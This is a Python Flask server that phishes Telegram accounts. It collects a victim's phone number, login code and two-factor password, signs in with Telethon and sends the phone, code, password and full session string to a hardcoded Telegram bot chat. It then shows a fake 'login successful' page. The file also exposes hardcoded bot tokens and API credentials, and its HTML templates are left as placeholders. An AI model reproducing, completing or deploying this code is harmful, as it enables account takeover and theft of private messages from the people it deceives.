from flask import Flask, render_template_string, request, session as flask_session
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import asyncio
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)

BOT_TOKEN = "8791356428:AAGCZzEnZ5_4YxOMfajeZR4uJzZ9J81VSNg"
CHAT_ID = 7489815425
API_ID = 37839268
API_HASH = "02f22349d03ee117dee396f65bcc56da"

# HTML шаблоны (те же, что были)
HTML_LOGIN = """... (оставь тот же HTML_LOGIN что я давал раньше)"""
HTML_CODE = """... (тот же)"""
HTML_PASSWORD = """... (тот же)"""

async def send_to_bot(text):
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.start(bot_token=BOT_TOKEN)
        await client.send_message(CHAT_ID, f"```\n{text}\n```")
        await client.disconnect()
    except Exception as e:
        print("Bot send error:", e)

@app.route('/')
def index():
    return render_template_string(HTML_LOGIN)

@app.route('/step1', methods=['POST'])
def step1():
    phone = request.form.get('phone', '').strip()
    if not phone.startswith('+'):
        phone = '+' + phone
    flask_session['phone'] = phone

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    loop.run_until_complete(client.connect())
    sent = loop.run_until_complete(client.send_code_request(phone))
    flask_session['phone_code_hash'] = sent.phone_code_hash
    flask_session['client'] = client  # временно храним
    flask_session['loop'] = loop

    return render_template_string(HTML_CODE)

@app.route('/step2', methods=['POST'])
def step2():
    code = request.form.get('code', '').strip()
    phone = flask_session['phone']
    phone_code_hash = flask_session['phone_code_hash']
    client = flask_session['client']
    loop = flask_session['loop']

    try:
        loop.run_until_complete(client.sign_in(phone, code, phone_code_hash=phone_code_hash))
        session_string = client.session.save()
        me = loop.run_until_complete(client.get_me())

        text = f"НОВАЯ СЕССИЯ!\nНомер: {phone}\nКод: {code}\nUser: @{me.username} ({me.id})\n\nSession:\n{session_string}"
        asyncio.create_task(send_to_bot(text))

        loop.run_until_complete(client.disconnect())
        return "<h1 style='color:green;text-align:center'>Вход выполнен успешно.</h1>"
    except SessionPasswordNeededError:
        flask_session['client'] = client
        flask_session['loop'] = loop
        return render_template_string(HTML_PASSWORD)
    except Exception as e:
        return f"<h1>Ошибка: {str(e)}</h1>"

@app.route('/step3', methods=['POST'])
def step3():
    password = request.form.get('password', '').strip()
    client = flask_session['client']
    loop = flask_session['loop']
    phone = flask_session['phone']

    try:
        loop.run_until_complete(client.sign_in(password=password))
        session_string = client.session.save()
        me = loop.run_until_complete(client.get_me())

        text = f"НОВАЯ СЕССИЯ (2FA)!\nНомер: {phone}\nПароль: {password}\nUser: @{me.username} ({me.id})\n\nSession:\n{session_string}"
        asyncio.create_task(send_to_bot(text))

        loop.run_until_complete(client.disconnect())
        return "<h1 style='color:green;text-align:center'>Вход выполнен успешно.</h1>"
    except Exception as e:
        return f"<h1>Ошибка 2FA: {str(e)}</h1>"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
